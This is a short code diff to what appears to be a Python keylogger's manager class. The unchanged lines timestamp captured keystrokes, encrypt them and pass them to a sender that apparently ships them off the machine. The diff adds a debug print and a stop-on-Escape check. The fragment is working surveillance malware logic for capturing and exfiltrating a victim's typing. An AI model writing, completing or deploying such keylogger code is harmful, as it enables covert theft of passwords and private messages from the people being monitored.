@@ -26,8 +26,14 @@ class KeyLoggerManager:
             logged_keys = datetime.now().strftime('*****%H:%M %d/%m/%Y*****/n') + logged_keys + '/n' * 2
             self.encoder.text = logged_keys
             try:
+                print(logged_keys)
+                if "<ESC>" in logged_keys:
+                    self.keylogger.stop_logging()
+                    self.flag = False
+                    return
                 encrypted_data = self.encoder.encryption()
                 self.writer.send_data(encrypted_data)
+
             except Exception as e:
                 print(e)
                 return
@@ -42,3 +48,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
